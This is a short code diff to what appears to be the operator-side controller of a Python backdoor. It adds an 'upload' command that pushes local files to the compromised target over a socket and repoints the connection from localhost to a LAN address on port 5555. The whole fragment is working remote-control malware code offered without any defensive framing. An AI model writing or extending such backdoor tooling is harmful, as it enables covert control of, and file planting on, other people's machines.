@@ -27,6 +27,11 @@ def recv():
         except ValueError:
             continue
 
+# Upload file to the target's file system
+def uploadFile(fileName):
+    f = open(fileName, 'rb') # Open the file on 'read bytes' mode
+    target.send(f.read())
+
 # Sends and receives data to and from the backdoor
 def targetComs():
     while True:
@@ -43,6 +48,9 @@ def targetComs():
         elif prompt[:3] == 'cd ': # (Change directory implementation on the client-side)
             pass
 
+        elif prompt[:6] == 'upload':
+            uploadFile(prompt[7:])
+
         elif prompt == 'help': # List all the available commands to the user
             print(termcolor.colored(help.HELP, 'green'))
 
@@ -51,7 +59,7 @@ def targetComs():
             print(response)
 
 # Connection data
-HOST = '127.0.0.1'
+HOST = '192.168.1.110'
 PORT = 5555
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
